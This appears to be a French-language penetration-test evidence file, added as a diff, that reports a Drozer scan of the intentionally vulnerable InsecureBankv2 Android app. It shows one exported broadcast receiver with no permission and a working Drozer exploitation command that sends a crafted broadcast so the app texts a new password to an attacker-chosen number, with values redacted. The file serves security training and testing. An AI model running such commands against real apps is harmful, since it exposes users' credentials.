@@ -1,0 +1,35 @@
+================================================================================
+DROZER - ANALYSE DES BROADCAST RECEIVERS EXPORTÉS
+Application : com.android.insecurebankv2 (InsecureBankv2)
+Date        : [DATE_ANALYSE]
+Commande    : dz> run app.broadcast.info -a com.android.insecurebankv2
+================================================================================
+
+Package: com.android.insecurebankv2
+
+  com.android.insecurebankv2.MyBroadCastReceiver
+    Permission : null   ← AUCUNE PROTECTION
+    IntentFilter:
+      Action   : theBroadcast
+
+================================================================================
+RÉSUMÉ : 1 receiver exporté — 1 sans permission de protection
+================================================================================
+
+COMMANDE DE VÉRIFICATION :
+----------------------------
+dz> run app.broadcast.info -a com.android.insecurebankv2
+
+COMMANDE D'EXPLOITATION DÉMONTRÉE :
+-------------------------------------
+dz> run app.broadcast.send \
+    --action theBroadcast \
+    --extra string phonenumber [NUMERO_REDACTE] \
+    --extra string newpass [MDP_REDACTE]
+
+→ RÉSULTAT : Le receiver traite le broadcast et envoie un SMS contenant
+             le nouveau mot de passe vers le numéro fourni par l'attaquant.
+
+NOTE : Les valeurs sensibles (numéro de téléphone, mot de passe de test)
+       ont été volontairement masquées dans ce document de preuve.
+================================================================================
